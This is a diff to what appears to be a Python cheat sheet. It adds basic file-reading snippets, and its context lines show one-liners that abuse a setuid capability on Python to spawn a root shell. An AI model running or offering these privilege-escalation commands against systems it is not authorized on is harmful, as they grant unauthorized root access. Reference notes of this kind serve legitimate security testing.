@@ -3675,6 +3675,14 @@ if __name__ == "__main__":
 # python with setuid capability? --> spawn root shell
 python -c 'import pty,os;os.setuid(0);pty.spawn("/bin/bash")'
 python3 -c 'import pty,os;os.setuid(0);pty.spawn("/bin/bash")'
+
+
+# read from file
+my_file = open("/path/to/file","r") # r = read, w = write
+data = my_file.read() # whole file as string
+data = my_file.readline() # one line as string
+data = my_file.readlines() # all lines as string element in list
+my_file.close()
 ```
 
 
